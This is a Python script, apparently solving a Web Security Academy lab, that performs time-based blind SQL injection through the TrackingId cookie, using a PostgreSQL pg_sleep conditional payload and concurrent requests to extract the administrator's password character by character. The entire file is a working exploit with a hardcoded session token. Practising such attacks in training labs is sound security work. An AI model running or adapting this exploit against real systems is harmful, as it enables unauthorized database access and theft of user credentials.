import aiohttp
import asyncio


async def send_req(session, lab_url, user_session, char, position):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://0a01003f036680a3910d5a7b00e80023.web-security-academy.net/",
        "Upgrade-Insecure-Requests": "1",
        "Cookie": f"TrackingId=qTHhZal2P2EteajI'+||+(SELECT CASE WHEN (SUBSTR(password,{position},1)='{char}') THEN pg_sleep(10) END FROM users WHERE username='administrator')--;session={user_session};"
    }
    try:
        async def _req():
            async with session.get(lab_url, headers=headers):
                return None
        await asyncio.wait_for(_req(), timeout=3)
    except Exception:
        return (position, char)


async def main():
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    lab_url = "https://0a120056039710e781761d43008e0032.web-security-academy.net/"
    user_session = "yihjAIViO8v6vz4BABw6KVxGA6bJZgOR"
    password = {}

    async with aiohttp.ClientSession() as session:
        for position in range(1, 30):
            tasks = [send_req(session, lab_url, user_session, char, position) for char in characters]
            results = await asyncio.gather(*tasks)

            for result in results:
                if result:
                    pos, char = result
                    password[pos] = char
                    print(f"[+] Found char at pos {pos}: {char}")

    cracked = "".join(password.get(i, "") for i in range(1, 30))
    print(f"\n[FINAL PASSWORD PART]: {cracked}")


if __name__ == "__main__":
    asyncio.run(main())
